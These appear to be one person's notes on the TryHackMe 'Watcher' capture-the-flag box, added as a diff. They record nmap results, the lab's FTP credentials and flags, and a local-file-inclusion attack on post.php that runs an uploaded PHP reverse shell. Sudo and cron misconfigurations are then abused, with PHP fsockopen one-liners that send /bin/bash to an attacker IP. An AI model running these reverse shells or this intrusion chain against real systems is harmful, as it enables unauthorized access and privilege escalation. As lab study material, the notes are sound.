@@ -1,0 +1,95 @@
+THM - Watcher - 31 Oct 2022
+
+10.10.101.140
+https://swehtpantz.medium.com/tryhackmes-watcher-by-uswcss-walkthrough-by-swehtpantz-e378388fc183
+---------------------
+users
+mat
+toby
+will
+
+creds:
+ftpuser:givemefiles777		ftp
+
+flags:
+
+	user.txt
+	root.txt
+FLAG{robots_dot_text_what_is_next}	flag1
+FLAG{ftp_you_and_me}			flag2
+FLAG{lfi_what_a_guy}			flag3
+FLAG{chad_lifestyle}			flag4
+FLAG{live_by_the_cow_die_by_the_cow}	flag5
+--------------------------------------
+
+
+PORT   STATE SERVICE REASON         VERSION
+21/tcp open  ftp     syn-ack ttl 64 vsftpd 3.0.3
+22/tcp open  ssh     syn-ack ttl 64 OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
+80/tcp open  http    syn-ack ttl 64 Apache httpd 2.4.29 ((Ubuntu))
+|_http-generator: Jekyll v4.1.1
+| http-methods: 
+|_  Supported Methods: GET HEAD POST OPTIONS
+|_http-server-header: Apache/2.4.29 (Ubuntu)
+|_http-title: Corkplacemats
+MAC Address: 02:CD:80:DA:2D:91 (Unknown)
+Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
+
+
+80 http:
+
+/robots.txt
+
+User-agent: *
+Allow: /flag_1.txt
+Allow: /secret_file_do_not_read.txt
+
+10.10.101.140/post.php?post=/var/www/html/secret_file_do_not_read.txt
+Hi Mat, The credentials for the FTP server are below. I've set the files to be saved to /home/ftpuser/ftp/files. Will ---------- ftpuser:givemefiles777 
+
+***can put files into the files folder on ftp with 777 perms
+created revshell.php
+uploaded to ftp server
+LFI http://10.10.101.140/post.php?post=/home/ftpuser/ftp/files/revshell.php
+**caught revshell on 4444
+
+www-data@watcher:/home$ cat /var/www/html/more_secrets_a9f10a/flag_3.txt
+FLAG{lfi_what_a_guy}
+
+User www-data may run the following commands on watcher:
+    (toby) NOPASSWD: ALL
+
+www-data@watcher:/home/toby$ sudo -u toby cat flag_4.txt 
+FLAG{chad_lifestyle}
+
+tried using nc to set up rev shell from toby but -e has been depricated.
+alternateive ... use php code
+
+sudo -u toby php -r '$sock=fsockopen("10.10.227.198",4242);exec("/bin/bash <&3 >&3 2>&3");'
+
+****revshell as toby !!
+
+***same thing again ... except modiy cow.sh with
+php -r '$sock=fsockopen("10.10.227.198",4141);exec("/bin/bash <&3 >&3 2>&3");'
+
+**** catch anothe revshell as matt
+
+mat@watcher:~$ cat flag_5.txt 
+FLAG{live_by_the_cow_die_by_the_cow}
+
+User mat may run the following commands on watcher:
+    (will) NOPASSWD: /usr/bin/python3 /home/mat/scripts/will_script.py *
+
+
+/etc/crontab
+
+# /etc/crontab: system-wide crontab # Unlike any other crontab you don't have to run the `crontab' # command to install the new version when you edit this file # and files in /etc/cron.d. These files also have username fields, # that none of the other crontabs do. SHELL=/bin/sh PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin # m h dom mon dow user command 17 * * * * root cd / && run-parts --report /etc/cron.hourly 25 6 * * * root test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily ) 47 6 * * 7 root test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly ) 52 6 1 * * root test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly ) # */1 * * * * mat /home/toby/jobs/cow.sh 
+
+cow.sh
+
+#!/bin/bash cp /home/mat/cow.jpg /tmp/cow.jpg
+
+
+/etc/passwd
+
+root:x:0:0:root:/root:/bin/bash daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin bin:x:2:2:bin:/bin:/usr/sbin/nologin sys:x:3:3:sys:/dev:/usr/sbin/nologin sync:x:4:65534:sync:/bin:/bin/sync games:x:5:60:games:/usr/games:/usr/sbin/nologin man:x:6:12:man:/var/cache/man:/usr/sbin/nologin lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin mail:x:8:8:mail:/var/mail:/usr/sbin/nologin news:x:9:9:news:/var/spool/news:/usr/sbin/nologin uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin proxy:x:13:13:proxy:/bin:/usr/sbin/nologin www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin backup:x:34:34:backup:/var/backups:/usr/sbin/nologin list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin systemd-network:x:100:102:systemd Network Management,,,:/run/systemd/netif:/usr/sbin/nologin systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd/resolve:/usr/sbin/nologin syslog:x:102:106::/home/syslog:/usr/sbin/nologin messagebus:x:103:107::/nonexistent:/usr/sbin/nologin _apt:x:104:65534::/nonexistent:/usr/sbin/nologin lxd:x:105:65534::/var/lib/lxd/:/bin/false uuidd:x:106:110::/run/uuidd:/usr/sbin/nologin dnsmasq:x:107:65534:dnsmasq,,,:/var/lib/misc:/usr/sbin/nologin landscape:x:108:112::/var/lib/landscape:/usr/sbin/nologin pollinate:x:109:1::/var/cache/pollinate:/bin/false sshd:x:110:65534::/run/sshd:/usr/sbin/nologin will:x:1000:1000:will:/home/will:/bin/bash ftp:x:111:114:ftp daemon,,,:/srv/ftp:/usr/sbin/nologin ftpuser:x:1001:1001:,,,:/home/ftpuser:/usr/sbin/nologin mat:x:1002:1002:,#,,:/home/mat:/bin/bash toby:x:1003:1003:,,,:/home/toby:/bin/bash
